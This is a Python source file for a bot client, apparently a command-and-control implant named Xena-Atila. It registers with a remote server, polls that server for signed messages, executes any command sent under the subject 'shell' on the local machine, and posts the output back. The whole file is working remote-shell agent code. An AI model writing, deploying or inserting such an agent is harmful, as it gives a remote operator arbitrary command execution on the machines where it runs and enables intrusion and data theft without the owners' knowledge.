import json
import logging
import python_jwt as jwt

from time import sleep
from env import Env
from requests import post, get
from uuid import uuid4
from typing import Union
from base64 import b64decode, b64encode
from services.system import System

# Unique identifier of this bot instance.
client_id = str(uuid4())

# Message from Atila.
class Message:
  def __init__(self, id: str, from_id: str, to: str, subject: str, content: str, status: str, reply_to: str,):
    self.id = id
    self.from_id = from_id
    self.to = to
    self.subject = subject
    self.content = content
    self.status = status
    self.reply_to = reply_to

  @staticmethod
  def from_json(json):
    return Message(
      id = json['id'],
      from_id = json['from'],
      to = json['to'],
      subject = json['subject'],
      content = json['content'],
      status = json['status'],
      reply_to = json['replyTo'],
    )

  def serialize(self):
    return {
      'id': self.id,
      'from': self.from_id,
      'to': self.to,
      'subject': self.subject,
      'content': self.content,
      'status': self.status,
      'replyTo': self.reply_to,
    }

class XenaAtila:
  def __init__(self):
    logging.debug('Unique identifier at ' + client_id)

    self.remote = Env()['XENA_ATILA_HOST']

    # Identify to the Atila.
    while True:
      try:
        if self.identify(self.remote) == True:
          break
      except Exception as e:
        logging.debug('Unable to identify for ' + self.remote + ' with the error:' + e)
      sleep(10)
    
    logging.debug('Xena-Atila has been successfuly recognized by ' + self.remote)

    # Fetch message loop.
    while True:
      messages = self.read_inbox(self.remote)
      print(messages)
      sleep(10)

  def read_inbox(self, remote_host: str) -> Union[Message, None]:
    messages_response = get(remote_host + '/v1/messages?clientId=' + client_id)

    # No messages for the client.
    if (messages_response.status_code != 200):
      return None

    maybe_messages = json.loads(messages_response.content.decode('utf-8'))

    # Loop over each message.
    for maybe_message in maybe_messages:
      message = Message.from_json(maybe_message)

      subject = message.subject
      # content = b64decode(message.content).decode('utf-8')
      content = jwt.verify_jwt(message.content, Env()['MASTER_PUBLIC_KEY'], ['RS512'])[1]

      print()
      print(content)
      print()

      if subject == 'shell':
        shell_output = System.do(content['shell'])
        
        message_insertion = post(self.remote + "/v1/messages", data = {
          'from': client_id,
          'to': None,
          'subject': 'shell-output',
          'content': b64encode(str.encode(shell_output)),
          'replyTo': message.id,
        })

        if (message_insertion.status_code != 200):
          continue
        
        message_ack = post(self.remote + '/v1/messages/ack', data = {
          'id': message.id,
        })

        if (message_ack.status_code != 200):
          logging.warn('Message ACK failure has occured, but it is not handled!')
          logging.debug(message_ack.json())

  # Make yourself known to the remote host.
  def identify(self, remote_host: str) -> bool:
    response = post(remote_host + '/v1/clients', data = {
      'id': client_id,
      'publicKey': 'nokey',
      'status': 'ALIVE',
    })

    # The request has failed. If 409 is returned, means that we're already recognized peer.
    if response.status_code != 200 and response.status_code != 409:
      logging.debug('Identification failed with ' + str(response.status_code) + ' status code for ' + remote_host)
      logging.debug(response.json())
      return False
    
    return True

xena_atila: XenaAtila = XenaAtila()